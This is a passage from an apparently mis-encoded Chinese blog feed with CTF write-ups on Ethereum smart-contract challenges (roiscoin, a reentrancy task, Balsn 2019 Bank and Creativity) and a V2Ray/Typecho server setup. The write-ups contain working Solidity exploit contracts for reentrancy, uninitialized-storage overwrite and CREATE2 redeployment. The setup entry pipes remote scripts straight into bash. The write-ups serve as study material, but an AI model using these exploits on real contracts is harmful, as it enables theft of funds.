,å¦åˆ™ç»§ç»­è°ƒç”¨ hack2 ,ç›´è‡³è¿™ä¸€æ¬¡æˆåŠŸ è°ƒç”¨ hack3 ä¸¤æ¬¡,è¿™ä¸¤æ¬¡éœ€è¦æ»¡è¶³ result = 0 ,å¦åˆ™ç»§ç»­è°ƒç”¨ hack3 ,ç›´è‡³ä¸¤æ¬¡ä¸ºæ­¢ è°ƒç”¨ hack4 ä¿®æ”¹ owner ,è¿™é‡Œæœ‰ä¸ªå‘ç‚¹,é¢˜ç›®ç»™çš„åˆçº¦ä¸æ˜¯çœŸæ­£çš„åˆçº¦,å› ä¸ºè°ƒç”¨ hack4 æ€»æ˜¯ä¸èƒ½æˆåŠŸä¿®æ”¹ owner , é€†å‘åˆçº¦,å¯ä»¥çœ‹å‡º revise å‡½æ•°æœ‰é—®é¢˜,é¢å¤–è¦æ±‚ msg.sender æœ€ä½Žä½å­—èŠ‚æ˜¯ 0x61 ,æ‰€ä»¥å¯¹ msg.sender æ€»å…±æœ‰ä¸¤ç‚¹è¦æ±‚: å¤§äºŽ y å¹¶ä¸”æœ€ä½Žå­—èŠ‚æ˜¯ 0x61 è°ƒç”¨ hack5 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143pragma solidity ^0.4.23;contract FakeOwnerGame &#123; event SendFlag(address _addr); uint randomNumber = 0; uint time = now; mapping (address =&gt; uint) public BalanceOf; mapping (address =&gt; uint) public WinCount; mapping (address =&gt; uint) public FailCount; bytes32[] public codex; address private owner; uint256 settlementBlockNumber; address guesser; uint8 guess; struct FailedLog &#123; uint failtag; uint failtime; uint success_count; address origin; uint fail_count; bytes12 hash; address msgsender; &#125; mapping(address =&gt; FailedLog[]) FailedLogs; constructor() &#123; owner = msg.sender; &#125; modifier onlyOwner() &#123; require(msg.sender == owner); _; &#125; function payforflag() onlyOwner &#123; require(BalanceOf[msg.sender] &gt;= 2000); emit SendFlag(msg.sender); selfdestruct(msg.sender); &#125; function lockInGuess(uint8 n) public payable &#123; require(guesser == 0); require(msg.value == 1 ether); guesser = msg.sender; guess = n; settlementBlockNumber = block.number + 1; &#125; function settle() public &#123; require(msg.sender == guesser); require(block.number &gt; settlementBlockNumber); uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 2; if (guess == answer) &#123; WinCount[msg.sender] += 1; BalanceOf[msg.sender] += 1000; &#125; else &#123; FailCount[msg.sender] += 1; &#125; if (WinCount[msg.sender] == 2) &#123; if (WinCount[msg.sender] + FailCount[msg.sender] &lt;= 2) &#123; guesser = 0; WinCount[msg.sender] = 0; FailCount[msg.sender] = 0; msg.sender.transfer(address(this).balance); &#125; else &#123; FailedLog failedlog; failedlog.failtag = 1; failedlog.failtime = now; failedlog.success_count = WinCount[msg.sender]; failedlog.origin = tx.origin; failedlog.fail_count = FailCount[msg.sender]; failedlog.hash = bytes12(sha3(WinCount[msg.sender] + FailCount[msg.sender])); failedlog.msgsender = msg.sender; FailedLogs[msg.sender].push(failedlog); &#125; &#125; &#125; function beOwner() payable &#123; require(address(this).balance &gt; 0); if(msg.value &gt;= address(this).balance)&#123; owner = msg.sender; &#125; &#125; function revise(uint idx, bytes32 tmp) &#123; if(uint(msg.sender) &amp; 0x61 == 0x61 &amp;&amp; tx.origin != msg.sender) &#123; codex[idx] = tmp; &#125; &#125; function read_slot(uint k) public view returns (bytes32 res) &#123; assembly &#123; res := sload(k) &#125; &#125; function cal_addr(uint p) public pure returns(bytes32 res) &#123; res = keccak256(abi.encodePacked(p)); &#125;&#125;contract hack &#123; uint public result; address instance_address = 0x7be4ae576495b00d23082575c17a354dd1d9e429 ; FakeOwnerGame target = FakeOwnerGame(instance_address); constructor() payable&#123;&#125; // éšæœºçŒœä¸€ä¸ªæ•°0æˆ–1 function hack1() &#123; target.lockInGuess.value(1 ether)(0); &#125; // è¿™é‡Œå…ˆè®©result=1,å³å…ˆçŒœå¤±è´¥ function hack2() &#123; result = uint8(keccak256(block.blockhash(block.number - 1), now)) % 2; if (result == 1) &#123; target.settle(); &#125; &#125; // è¿™é‡Œè®©result=0,å³çŒœæµ‹æˆåŠŸ,è¿žç»­è°ƒç”¨ä¸¤æ¬¡ function hack3() &#123; result = uint8(keccak256(block.blockhash(block.number - 1), now)) % 2; if (result == 0) &#123; target.settle(); &#125; &#125; // ä¿®æ”¹owner function hack4() &#123; target.revise(114245411204874937970903528273105092893277201882823832116766311725579567940182,bytes32(address(this))); &#125; function hack5() &#123; target.payforflag(); &#125;&#125; å¯¹äºŽè¯¥é¢˜ç›®ç”Ÿæˆæ»¡è¶³ msg.sender çš„åˆçº¦åœ°å€å¯é€šè¿‡ä¸‹é¢è„šæœ¬ç”Ÿæˆ,ç›´æŽ¥è°ƒç”¨ generate_eoa2 å³å¯ 1234567891011121314151617181920212223242526272829303132333435from ethereum import utilsimport os, sys# generate EOA with appendix 1b1bdef generate_eoa1(): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) while not addr.lower().endswith("1b1b"): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) print('Address: &#123;&#125;\nPrivate Key: &#123;&#125;'.format(addr, priv.hex()))# generate EOA with the ability to deploy contract with appendix 1b1bdef generate_eoa2(): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) while not (utils.decode_addr(utils.mk_contract_address(addr, 0)).endswith("61") and utils.decode_addr(utils.mk_contract_address(addr, 0)).startswith("fd")): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) print('Address: &#123;&#125;\nPrivate Key: &#123;&#125;'.format(addr, priv.hex()))if __name__ == "__main__": if sys.argv[1] == "1": generate_eoa1() elif sys.argv[1] == "2": generate_eoa2() else: print("Please enter valid argument")]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>rctf 2020</tag>
        <tag>roiscoin</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä¸€é“å¾ˆç®€å•çš„åŒºå—é“¾é¢˜ç›®]]></title>
    <url>%2F2020%2Feasy-blockchains%2F</url>
    <content type="text"><![CDATA[å‰è¨€ ä¸ç»æ„é—´çœ‹åˆ°çš„ä¸€ä¸ªé¢˜ç›®ï¼Œå°±éšä¾¿åšäº†ä¸€ä¸‹ å¤§ä½¬å‹¿å–· åˆçº¦åœ°å€ï¼š0x496371aF69612e7C85F8a558f9f19E0c15E9d4B0 @ ropsten, payforflag(string memory b64email) Analyse æ²¡æœ‰ç»™æºç ï¼Œè‡ªå·±é€†å‘ï¼Œå¾—åˆ°ä¸‹é¢çš„é€»è¾‘ 12345678910111213141516171819202122232425262728293031323334353637383940pragma solidity ^0.4.23;contract test &#123; mapping(address=&gt;uint) public balance; address public owner; uint s2; uint s3; uint s4; function profit(uint amount) public &#123; require(balance[msg.sender] == 0); require(s2 != 0); if(amount % s2 == s3)&#123; require(s3 != 0); if(amount % s3 == s4)&#123; balance[msg.sender] += 3; &#125; &#125; &#125; function withdraw(uint amount) public &#123; require(amount == 2); require(balance[msg.sender] == 3); msg.sender.call.value(amount * 100000000000000)(); balance[msg.sender] -= amount; &#125; function payforflag(string memory b64email) public &#123; require(balance[msg.sender]&gt;=10000000000); &#125; function func_0531(uint t1, uint t2, uint t3) public &#123; require(msg.sender == owner); s2 = t1; s3 = t2; s4 = t3; &#125; &#125; å¾ˆç®€å•ï¼Œå…ˆè°ƒç”¨ profit ï¼Œä½¿å¾— balance[msg.sender] = 3 ï¼Œè¿™é‡Œ s2ã€s3ã€s4æ˜¯ownerè®¾ç½®çš„ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æŽ¥ web3.eth.getStorageAt æŸ¥çœ‹å³å¯ï¼Œå‘çŽ° s2=65537ã€s3=64834ã€s4=41958ï¼Œç„¶åŽå°±æ˜¯ä¸­å›½å‰©ä½™å®šç†æ±‚è§£é—®é¢˜ï¼Œå¯ç”¨ä¸‹é¢è„šæœ¬ï¼Œæ±‚å¾— amount=227609298 1234567891011121314151617181920212223#!/usr/bin/env python# -*- coding:utf-8 -*-from functools import reducedef egcd(a, b): """æ‰©å±•æ¬§å‡ é‡Œå¾—""" if 0 == b: return 1, 0, a x, y, q = egcd(b, a % b) x, y = y, (x - a // b * y) return x, y, qdef chinese_remainder(pairs): """ä¸­å›½å‰©ä½™å®šç†""" mod_list, remainder_list = [p[0] for p in pairs], [p[1] for p in pairs] mod_product = reduce(lambda x, y: x * y, mod_list) mi_list = [mod_product//x for x in mod_list] mi_inverse = [egcd(mi_list[i], mod_list[i])[0] for i in range(len(mi_list))] x = 0 for i in range(len(remainder_list)): x += mi_list[i] * mi_inverse[i] * remainder_list[i] x %= mod_product return xif __name__=='__main__': print(chinese_remainder([(65537, 64834), (64834, 41958)])) ç„¶åŽè°ƒç”¨ withdraw ä¸¤æ¬¡ï¼Œé‡å…¥æ”»å‡»ï¼Œä¾¿å¯æ»¡è¶³ balance[msg.sender]&gt;=10000000000 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667pragma solidity ^0.4.23;contract test &#123; mapping(address=&gt;uint) public balance; address public owner; uint s2; uint s3; uint s4; function profit(uint amount) public &#123; require(balance[msg.sender] == 0); require(s2 != 0); if(amount % s2 == s3)&#123; require(s3 != 0); if(amount % s3 == s4)&#123; balance[msg.sender] += 3; &#125; &#125; &#125; function withdraw(uint amount) public &#123; require(amount == 2); require(balance[msg.sender] == 3); msg.sender.call.value(amount * 100000000000000)(); balance[msg.sender] -= amount; &#125; function payforflag(string memory b64email) public &#123; require(balance[msg.sender]&gt;=10000000000); &#125; function func_0531(uint t1, uint t2, uint t3) public &#123; require(msg.sender == owner); s2 = t1; s3 = t2; s4 = t3; &#125; &#125;contract hack &#123; address instance_address = 0x496371aF69612e7C85F8a558f9f19E0c15E9d4B0 ; test target = test(instance_address); uint public have_withdraw = 0; constructor() payable&#123;&#125; function hack1() &#123; target.profit(227609298); &#125; function hack2() &#123; target.withdraw(2); &#125; function() payable &#123; if (have_withdraw == 0 &amp;&amp; msg.sender == instance_address)&#123; have_withdraw = 1; target.withdraw(2); &#125; &#125; function hack3(string memory b64email) &#123; target.payforflag(b64email); &#125;&#125; ä¾æ¬¡è°ƒç”¨ hack1ã€hack2ã€hack3å³å¯ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œéœ€è¦å…ˆå¼ºåˆ¶è½¬è´¦ç»™é¢˜ç›®åˆçº¦ï¼Œä¸ç„¶é‡å…¥æ”»å‡»æ²¡æ³•å®Œæˆ å®Œç»“ï¼Œæ’’èŠ±ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Balsn CTF 2019 - Bank]]></title>
    <url>%2F2020%2Fbalsn2019-bank%2F</url>
    <content type="text"><![CDATA[å‰è¨€ å¤çŽ° balsn2019 ctf ä¸­çš„ bank åŒºå—é“¾é¢˜ç›® wtcl ,å¤çŽ°äº†ä¸€ä¸ªä¸‹åˆ å…·ä½“åˆ†æžåŠå®˜æ–¹ WP å¦‚ä¸‹: https://x9453.github.io/2020/01/16/Balsn-CTF-2019-Bank/ å¤çŽ°åœ°å€ä¸º: ropsten@0x85B0446Dc5B5f32cbB674Dc8e49Fc27Ebaff2Ee2 å¤–éƒ¨è´¦æˆ·åœ°å€ä¸º: 0x785a8D0d84ad29c96f8e1F26BfDb3E6CB72cAe9b Source12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879pragma solidity ^0.4.24;contract Bank &#123; event SendEther(address addr); event SendFlag(address addr); address public owner; uint randomNumber = 0; constructor() public &#123; owner = msg.sender; &#125; struct SafeBox &#123; bool done; function(uint, bytes12) internal callback; bytes12 hash; uint value; &#125; SafeBox[] safeboxes; struct FailedAttempt &#123; uint idx; uint time; bytes12 triedPass; address origin; &#125; mapping(address =&gt; FailedAttempt[]) failedLogs; modifier onlyPass(uint idx, bytes12 pass) &#123; if (bytes12(sha3(pass)) != safeboxes[idx].hash) &#123; FailedAttempt info; info.idx = idx; info.time = now; info.triedPass = pass; info.origin = tx.origin; failedLogs[msg.sender].push(info); &#125; else &#123; _; &#125; &#125; function deposit(bytes12 hash) payable public returns(uint) &#123; SafeBox box; box.done = false; box.hash = hash; box.value = msg.value; if (msg.sender == owner) &#123; box.callback = sendFlag; &#125; else &#123; require(msg.value &gt;= 1 ether); box.value -= 0.01 ether; box.callback = sendEther; &#125; safeboxes.push(box); return safeboxes.length-1; &#125; function withdraw(uint idx, bytes12 pass) public payable &#123; SafeBox box = safeboxes[idx]; require(!box.done); box.callback(idx, pass); box.done = true; &#125; function sendEther(uint idx, bytes12 pass) internal onlyPass(idx, pass) &#123; msg.sender.transfer(safeboxes[idx].value); emit SendEther(msg.sender); &#125; function sendFlag(uint idx, bytes12 pass) internal onlyPass(idx, pass) &#123; require(msg.value &gt;= 100000000 ether); emit SendFlag(msg.sender); selfdestruct(owner); &#125;&#125; Analyse åˆçº¦åˆ›å»ºåŽ, slot å¸ƒå±€å¦‚ä¸‹ 123456789-----------------------------------------------------| unused (12) | owner (20) | &lt;- slot 0-----------------------------------------------------| randomNumber (32) | &lt;- slot 1-----------------------------------------------------| safeboxes.length (32) | &lt;- slot 2-----------------------------------------------------| occupied by failedLogs but unused (32) | &lt;- slot 3----------------------------------------------------- å…³äºŽ FailedAttempt å¸ƒå±€å¦‚ä¸‹,åœ¨ä»£ç  33-36 è¡Œå­˜åœ¨æœªåˆå§‹åŒ–æ¼æ´ž,ä¼šå¯¼è‡´è¦†ç›–åŽŸå…ˆ slot0 åˆ° slot2 çš„ä½ç½®å†…å®¹ 1234567-----------------------------------------------------| idx (32) |-----------------------------------------------------| time (32) |-----------------------------------------------------| origin (20) | triedPass (12) |----------------------------------------------------- åŒæ ·, SafeBox ä¹Ÿæ˜¯ç±»ä¼¼åˆ†æž,ä¼šåœ¨ deposit() ä¸­è¦†ç›– slot0 å’Œ slot1 12345-----------------------------------------------------| unused (11) | hash (12) | callback (8) | done (1) |-----------------------------------------------------| value (32) |----------------------------------------------------- å¯ä»¥çœ‹åˆ°,å¦‚æžœé€šè¿‡ deposit ä¿®æ”¹ slot0 å’Œ slot1 æ˜¯æ²¡ç”¨çš„,å³ä½¿ä¿®æ”¹äº† owner ä¹Ÿæ²¡ç”¨,å› ä¸ºè¿˜æœ‰ç¬¬ 74 è¡Œçš„é™åˆ¶ å…¶å®žé¢˜ç›®è€ƒæŸ¥çš„æ˜¯ç»“æž„ä½“æœªåˆå§‹åŒ–æ¼æ´ž+æ•°ç»„å­˜å‚¨æ–¹å¼+mappingå­˜å‚¨æ–¹å¼+æŽ§åˆ¶ç¨‹åºæ‰§è¡Œæµ å› ä¸º 33-36 è¡Œä¸­å¦‚æžœ origin è¶³å¤Ÿå¤§,ç›¸å½“äºŽä¿®æ”¹äº† safeboxes æ•°ç»„çš„é•¿åº¦,è®©æ•°ç»„çš„é•¿åº¦è¶³å¤Ÿå¤§,å¦‚æžœå¤§åˆ°å¯ä»¥ä¿®æ”¹æˆ–è€…è¦†ç›– failedLogs,é‚£ä¹ˆå°±å¯ä»¥é€šè¿‡ safeboxes æ•°ç»„åŽ»è®¿é—® failedLogs,å…¶å®žä¹Ÿç›¸å½“äºŽ failedLogs æ˜¯æ•°ç»„ safeboxes çš„å†…å®¹,æ‰€ä»¥è¿™å°±å¯¹ tx.origin æœ‰ä¸€å®šçš„è¦æ±‚ å‡è®¾ safeboxes å¯ä»¥åŒ…å« failedLogs,åŒæ—¶ FailedAttempt ä¸­çš„ triedPass å¯ä»¥è¦†ç›– Safebox çš„ callback : å› ä¸º triedPass æˆ‘ä»¬å¯ä»¥å®Œå…¨æŽ§åˆ¶,æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ triedPass æŽ§åˆ¶ callback ,è¿›ä¸€æ­¥æŽ§åˆ¶ç¨‹åºæ‰§è¡Œæµ(ç¬¬64è¡Œ) å¦‚æžœèƒ½å¤ŸæŽ§åˆ¶ç¨‹åºæ‰§è¡Œæµçš„è¯,é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°ç¬¬ 75 è¡Œ emit SendFlag(msg.sender);çš„ä½ç½®å°±è¡Œäº†,è¿™ä¸ªå¯ä»¥é€šè¿‡æŸ¥çœ‹ bytecodes å¯¹åº”çš„ opcode æ‰¾åˆ°,å¦‚ä¸‹å›¾,æˆ‘ä»¬å…ˆæ‰¾åˆ° require(msg.value &gt;= 100000000 ether); å¯¹åº”çš„ä½ç½®,ç„¶åŽå†æ‰¾ emit SendFlag(msg.sender); å¯¹åº”çš„ä½ç½®,å› ä¸ºåœ¨EVMä¸­è°ƒç”¨ä¸€ä¸ªå‡½æ•°ç›¸å½“äºŽæ‰§è¡Œ jump æ“ä½œ,è€Œè·³åˆ°çš„åœ°æ–¹éƒ½æ˜¯ä»¥ jumpdest å¼€å§‹,æ‰€ä»¥ 0x070f å°±æ˜¯æˆ‘ä»¬æƒ³è¦è·³åˆ°çš„ä½ç½®,è¿™æ ·çš„è¯å°±å¯ä»¥è§¦å‘ SendFlag äº‹ä»¶äº† Solution è®¡ç®— target = keccak256(keccak256(msg.sender||3)) + 2 ,è¿™é‡Œ target å°±æ˜¯ FailedAttempt[0] ä¸­çš„ origin(20) | triedPass(12) è®¡ç®— base = keccak256(2) ,è¿™é‡Œ base å°±æ˜¯ safeboxes æ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ åœ¨ slot çš„ä½ç½® è®¡ç®— idx = (target - base) // 2 , è¿™é‡Œ idx æŒ‡çš„æ˜¯åœ¨ safeboxes æ•°ç»„ä¸­çš„ç´¢å¼•,å› ä¸ºä¸€ä¸ª Safebox å æ®ä¸¤ä¸ª slot ,æ‰€ä»¥è¦é™¤ä»¥ 2 è®¡ç®— (target - base) % 2 ,å¦‚æžœç­‰äºŽ 0 ,è¯´æ˜Ž origin(20) | triedPass(12) åˆšå¥½å¯ä»¥è¦†ç›– unused (11) | hash (12) | callback (8) | done (1) è®¡ç®— (msg.sender &lt;&lt; (12*8)) ,å¦‚æžœ &lt; idx ,è¯´æ˜Ž safeboxes æ•°ç»„é•¿åº¦åˆé€‚,å¯ä»¥åŒ…å« failedLogs ; å¦åˆ™çš„è¯ä»Žæ­¥éª¤1é‡æ–°å¼€å§‹ è°ƒç”¨ deposit(0x000000000000000000000000) å¹¶è®¾ç½® msg.value = 1 ether : è¿™é‡Œæ˜¯è®© callback æŒ‡å‘ sendEther , ç›®çš„æ˜¯ä¸‹ä¸€æ­¥è°ƒç”¨æŽ§åˆ¶ safeboxes æ•°ç»„é•¿åº¦ è°ƒç”¨ withdraw(0, 0x111111111111110000070f00) : è¿™é‡Œç›¸å½“äºŽè°ƒç”¨ sendEther(0, 0x111111111111110000070f00) ,å°† failedLogs[msg.sender] ä¸­çš„ triedPass æŽ§åˆ¶,ç›¸å½“äºŽæŽ§åˆ¶äº† unused (11) | hash (12) | callback (8) | done (1) æ‰€åœ¨ slot çš„ä½Ž 12 å­—èŠ‚,ä¿®æ”¹äº† callback ,å…¶å®žç›¸å½“äºŽæŠŠ failedLogs[msg.sender] å¯¹åº”çš„å†…å®¹çœ‹æˆæ˜¯ safeboxes æ•°ç»„çš„å†…å®¹,åŒæ—¶ä¿®æ”¹äº†æ•°ç»„é•¿åº¦ è°ƒç”¨ withdraw(idx, 0x000000000000000000000000) : è¿™é‡Œå°±å¯ä»¥æ‰§è¡Œåˆ° emit SendFlag(msg.sender); æ’’èŠ±ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ é¢˜å¤–çŸ¥è¯†12345678910111213141516contract C &#123; address a; uint r; uint[] b; mapping(uint =&gt; uint) m; constructor() public &#123; a = msg.sender; r = 777; b.push(333); b.push(444); m[999] = 888; &#125;&#125;// bç¬¬ä¸€ä¸ªå…ƒç´ ä½ç½®åœ¨keccak256(2),å³slot(keccak256(2)+0)å­˜å‚¨333,slot(keccak256(2)+1)å­˜å‚¨444// m[k]å­˜å‚¨åœ¨slot(keccak256(k||3)),å³slot(keccak256(999||3))å­˜å‚¨888 å¯é€šè¿‡ä¸‹åˆ—å‡½æ•°åˆ†åˆ«èŽ·å– slot å†…å®¹ã€mapping å†…å®¹å¯¹åº” slot ã€æ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ å¯¹åº” slot 1234567891011function read_slot(uint k) public view returns (bytes32 res) &#123; assembly &#123; res := sload(k) &#125;&#125;function cal_addr(uint k, uint p) public pure returns(bytes32 res) &#123; res = keccak256(abi.encodePacked(k, p));&#125;function cal_addr(uint p) public pure returns(bytes32 res) &#123; res = keccak256(abi.encodePacked(p));&#125;]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>balsn2019</tag>
        <tag>bank</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[djJyYXk=(b64)ä¼ªè£… + å®å¡” + typecho]]></title>
    <url>%2F2020%2FTypecho-V2ray%2F</url>
    <content type="text"><![CDATA[å‰è¨€ æ¢ä¸ªåŠ¨æ€åšå®¢ typecho ä¸ºäº†çœé’±,åœ¨åŒä¸€ä¸ª vps ä¸Šæ­å»ºäº† djJyYXk= å’Œ typecho ç”±äºŽä¹‹å‰æ‘¸ç´¢æ­å»ºçš„æ–¹æ³•,ä¸­é—´èµ°äº†å¾ˆå¤šæ›²æŠ˜è·¯,ç”±äºŽç”³è¯·å¤ªå¤š ssl è¯ä¹¦,å¯¼è‡´åŸŸåæš‚æ—¶è¢« Let&#39;s Encrypt æ‹‰å…¥é»‘åå•,æ‰€ä»¥ç›®å‰æ²¡æ³•æ›´æ¢åˆ° typecho ,å…ˆè®°å½•ä¸€ä¸‹æ–¹æ³•å§ ä¸ºäº†çœäº‹,ç›´æŽ¥ç”¨äº†å®å¡”,å…ˆå®‰è£…å®å¡” 1yum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; bash install.sh ç„¶åŽç”¨å®å¡”å®‰è£… typecho ,è¿™é‡Œä¸è¦ç”³è¯· ssl è¯ä¹¦ å†å®‰è£… djJyYXk= ä¼ªè£… 1bash &lt;(curl -sL https://raw.githubusercontent.com/hijkpw/scripts/master/centos_install_v2ray2.sh) æœ€åŽä¿®æ”¹ nginx , è·¯å¾„ä¸º /www/server/panel/vhost/nginx/blog.hitcxy.com.conf, æŠŠ blog.hitcxy.com æ¢æˆç›¸å¯¹åº”çš„ä¸»æœºåå³å¯, ssl è¯ä¹¦ç”¨ v2ray ç”³è¯·çš„ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768server &#123; listen 80; server_name blog.hitcxy.com; return 301 https://$server_name:443$request_uri;&#125;server &#123; listen 443 ssl http2; server_name blog.hitcxy.com; charset utf-8; # sslé…ç½® ssl_protocols TLSv1.1 TLSv1.2; ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4; ssl_ecdh_curve secp384r1; ssl_prefer_server_ciphers on; ssl_session_cache shared:SSL:10m; ssl_session_timeout 10m; ssl_session_tickets off; ssl_certificate /etc/letsencrypt/live/blog.hitcxy.com/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/blog.hitcxy.com/privkey.pem; #PHP-INFO-START PHPå¼•ç”¨é…ç½®ï¼Œå¯ä»¥æ³¨é‡Šæˆ–ä¿®æ”¹ include enable-php-70.conf; #REWRITE-START URLé‡å†™è§„åˆ™å¼•ç”¨,ä¿®æ”¹åŽå°†å¯¼è‡´é¢æ¿è®¾ç½®çš„ä¼ªé™æ€è§„åˆ™å¤±æ•ˆ include /www/server/panel/vhost/rewrite/blog.hitcxy.com.conf; root /www/wwwroot/blog.hitcxy.com; location / &#123; index index.php index.html index.htm default.php default.htm default.html; # proxy_pass http://www.ddxsku.com/; &#125; #ç¦æ­¢è®¿é—®çš„æ–‡ä»¶æˆ–ç›®å½• location ~ ^/(\.user.ini|\.htaccess|\.git|\.svn|\.project|LICENSE|README.md) &#123; return 404; &#125; location ~ .*\.(gif|jpg|jpeg|png|bmp|swf)$ &#123; expires 30d; error_log off; access_log /dev/null; &#125; location ~ .*\.(js|css)?$ &#123; expires 12h; error_log off; access_log /dev/null; &#125; access_log /www/wwwlogs/blog.hitcxy.com.log; error_log /www/wwwlogs/blog.hitcxy.com.error.log; location /pikachu_ufo &#123; proxy_redirect off; proxy_pass http://127.0.0.1:29001; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &quot;upgrade&quot;; proxy_set_header Host $host; # Show real IP in v2ray access.log proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125;&#125;]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>djJyYXk=</tag>
        <tag>å®å¡”</tag>
        <tag>typecho</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Balsn CTF 2019 - Creativity]]></title>
    <url>%2F2020%2Fbalsn2019-create2%2F</url>
    <content type="text"><![CDATA[å‰è¨€ å¤çŽ° balsn2019 ctf ä¸­çš„ Creativity åŒºå—é“¾é¢˜ç›® è¿™é“é¢˜å…¶å®žæ—©å°±æƒ³å¤çŽ°äº†,åªä¸è¿‡ä¸€ç›´æ²¡æœ‰å¤çŽ°æˆåŠŸ,æ˜¯æœ‰å…³ create2 çš„éªšæ“ä½œ,åŸºæœ¬æ“ä½œå¯å‚è€ƒå¦å¤–ä¸€ç‰‡æ–‡ç« https://hitcxy.com/2020/Create2/ å…·ä½“åˆ†æžåŠå®˜æ–¹ WP å¦‚ä¸‹: https://x9453.github.io/2020/01/04/Balsn-CTF-2019-Creativity/ åŽŸè°…æˆ‘èœçš„æŠ è„šâ€¦éƒ½ 2020 äº†,è¿˜åœ¨åš 2019 çš„é¢˜ç›® å¤çŽ°åœ°å€ä¸º: ropsten@0x3975c105e8D582A324F6093E7471fDf9d5b9Fa67 Source1234567891011121314151617181920212223242526pragma solidity ^0.5.10;contract Creativity &#123; event SendFlag(address addr); address public target; uint randomNumber = 0; function check(address _addr) public &#123; uint size; assembly &#123; size := extcodesize(_addr) &#125; require(size &gt; 0 &amp;&amp; size &lt;= 4); target = _addr; &#125; function execute() public &#123; require(target != address(0)); target.delegatecall(abi.encodeWithSignature("")); selfdestruct(address(0)); &#125; function sendFlag() public payable &#123; require(msg.value &gt;= 100000000 ether); emit SendFlag(msg.sender); &#125;&#125; Analyse é¢˜ç›®å¤§æ¦‚é€»è¾‘æ˜¯: è®©æˆ‘ä»¬éƒ¨ç½²ä¸€ä¸ªåˆçº¦,åˆçº¦ä»£ç å¤§å°ä¸è¶…è¿‡4å­—èŠ‚ è°ƒç”¨ check ,å‚æ•°æ˜¯æˆ‘ä»¬éƒ¨ç½²çš„åˆçº¦åœ°å€ è°ƒç”¨ execute ,æ‰§è¡Œ delegatecall åˆ°æˆ‘ä»¬éƒ¨ç½²çš„åˆçº¦å†… ä½†æ˜¯,æœ‰ä¸ªé—®é¢˜,æˆ‘ä»¬æ²¡æ³•åœ¨4ä¸ªå­—èŠ‚å†… emit SendFlag å…¶å®žé¢˜ç›®è€ƒæŸ¥çŸ¥è¯†ç‚¹ä¸º Create2 çš„éªšæ“ä½œ: åœ¨åŒä¸€ä¸ªåœ°å€ä¸Šéƒ¨ç½²åˆçº¦,åˆçº¦çš„å­—èŠ‚ç å¯ä»¥ä¸åŒ,å³åœ¨åŒä¸€ä¸ªåœ°å€ä¸Šå…ˆåŽå¯éƒ¨ç½²ä¸åŒçš„åˆçº¦ é€šè¿‡è°ƒç”¨ä¸‹é¢ Deployer.deploy å‡½æ•°,æˆ‘ä»¬å¯ä»¥æŠŠä¸åŒåˆçº¦å…ˆåŽéƒ¨ç½²åœ¨åŒä¸€ä¸ªåœ°å€ä¸Š, deployedAddr å³ä¸ºéƒ¨ç½²çš„åˆçº¦åœ°å€ 123456789101112131415161718192021222324252627pragma solidity ^0.5.10;contract Deployer &#123; bytes public deployBytecode; address public deployedAddr; function deploy(bytes memory code) public &#123; deployBytecode = code; address a; // Compile Dumper to get this bytecode bytes memory dumperBytecode = hex'6080604052348015600f57600080fd5b50600033905060608173ffffffffffffffffffffffffffffffffffffffff166331d191666040518163ffffffff1660e01b815260040160006040518083038186803b158015605c57600080fd5b505afa158015606f573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052506020811015609857600080fd5b81019080805164010000000081111560af57600080fd5b8281019050602081018481111560c457600080fd5b815185600182028301116401000000008211171560e057600080fd5b50509291905050509050805160208201f3fe'; assembly &#123; a := create2(callvalue, add(0x20, dumperBytecode), mload(dumperBytecode), 0x8866) &#125; deployedAddr = a; &#125;&#125;contract Dumper &#123; constructor() public &#123; Deployer dp = Deployer(msg.sender); bytes memory bytecode = dp.deployBytecode(); assembly &#123; return (add(bytecode, 0x20), mload(bytecode)) &#125; &#125;&#125; æ‰€ä»¥é¢˜ç›®çš„é€»è¾‘å¦‚ä¸‹: ç”¨ create2 